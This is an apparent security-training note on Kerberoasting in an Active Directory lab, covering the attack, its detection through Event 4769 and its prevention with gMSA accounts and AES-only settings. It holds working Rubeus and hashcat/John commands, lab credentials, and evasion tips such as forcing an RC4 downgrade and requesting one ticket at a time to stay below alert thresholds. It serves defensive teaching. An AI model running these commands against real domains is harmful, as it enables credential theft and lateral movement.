name: Kerberoasting — Attack, Detection & Defense
description: Kerberoasting extracts Kerberos TGS tickets for accounts with SPNs and cracks them offline. Detection: Event 4769 with RC4 encryption type, or bulk ticket requests from a single source. Prevention: strong passwords (100+chars), GMSA accounts, disable RC4.
notes:
Lab: RDP as bob/Slavi123 to WS001 (<TARGET_IP>)
Domain: eagle.local | DC1: <DC1_IP> | DC2: <DC2_IP> | WS001: <WS001_IP> | Kali: <KALI_IP>

=== ATTACK ===
# Step 1: Extract all Kerberoastable TGS tickets (WS001 PS)
.\Rubeus.exe kerberoast /outfile:spn.txt
  → Targets all users with SPN registered (excluding krbtgt and disabled accounts)
  → Tickets written to spn.txt
  → Note: if account supports AES, Rubeus will extract AES ticket by default
  →       Add /rc4opsec or /tgtdeleg to force downgrade to RC4

# Step 2: Transfer spn.txt to Kali, then crack
hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
  → 13100 = Kerberos 5, etype 23 (RC4), TGS-REP
  → Append --force if hashcat errors on VM

# Alternative: John the Ripper
sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot

=== DETECTION ===
Event ID 4769: Kerberos Service Ticket Requested
  → High volume by default — filter for:
    (a) RC4 encryption type (Ticket Encryption Type 0x17) when AES is enforced env-wide
    (b) >10 tickets from same source IP/user within 1 minute (bulk extraction)
  → Alert on tickets for honeypot SPN accounts (any request = malicious)

Honeypot SPN user criteria:
  → Old account (2+ years), old password, privileged-looking name
  → Must have SPN registered (IIS/SQL looks legitimate)
  → Any 4769 for this account = alert

=== PREVENTION ===
  → 100+ character random passwords for SPN accounts (127 max in AD)
  → Use Group Managed Service Accounts (GMSA) where supported
  → Disable RC4 where all apps support AES
  → Audit and remove unused SPNs regularly

references.title: Microsoft - Group Managed Service Accounts Overview

recommended.note: Similar attack targeting accounts with Kerberos pre-auth disabled.
Once service account password cracked, DCSync may be possible with replication rights.

defense.why_it_works: Any authenticated domain user can request a TGS ticket for any account that has an SPN registered. The ticket is encrypted with the service account's password hash, so it can be extracted and cracked offline — no elevated rights are needed and the cracking never touches the network.
defense.prerequisites: Any valid domain user account, and a target account with an SPN registered (krbtgt and disabled accounts are excluded).
defense.impact: The cleartext password of the SPN/service account after offline cracking. If that account is privileged (or reused elsewhere), this becomes a direct path to escalation or lateral movement.
defense.detection: Event 4769 (Kerberos Service Ticket Requested). It is high-volume by default, so filter for: (a) RC4 encryption type (0x17) when AES is enforced environment-wide, and (b) more than ~10 tickets from one source IP/user within a minute (bulk extraction). Any 4769 for a honeypot SPN account is malicious by definition.
defense.artifacts: 4769 events on the DC; an spn.txt (or equivalent) hash dump on the attacker host; Rubeus.exe execution. A honeypot SPN account (old account, old password, privileged-looking name, IIS/SQL-style SPN) fires 4769 on any request.
defense.prevention: Use 100+ character random passwords for SPN accounts (127 max in AD); prefer Group Managed Service Accounts (gMSA); disable RC4 where every app supports AES; audit and remove unused SPNs regularly.
defense.evasion: Rubeus can force an RC4 downgrade (/rc4opsec, /tgtdeleg) to obtain crackable tickets even where AES is preferred; requesting a single ticket at a time stays below the bulk-volume alert threshold.
defense.misconfiguration: Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords — or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).
defense.vulnerable_config:
# Service account set up manually with a weak password + SPN
# Attacker can find these with:
Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet

# Bad state — password set 4 years ago, RC4 permitted:
# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433
# RC4 (0x17) requested in TGS ticket — short hash, GPU-crackable

# Confirming RC4 is available:
Get-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes
# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)
defense.secure_config:
# Fix 1 — Use Group Managed Service Accounts (gMSA): 240-char random passwords,
# auto-rotated by AD, no human ever knows the password
New-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \
    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'
Install-ADServiceAccount gmsa_sql

# Fix 2 — For legacy accounts that must keep SPNs:
# Set a 100+ character random password (AD max is 127 chars):
$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)
Set-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)

# Fix 3 — Disable RC4, require AES-only:
Set-ADUser svc_sql -KerberosEncryptionType AES128,AES256
# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)
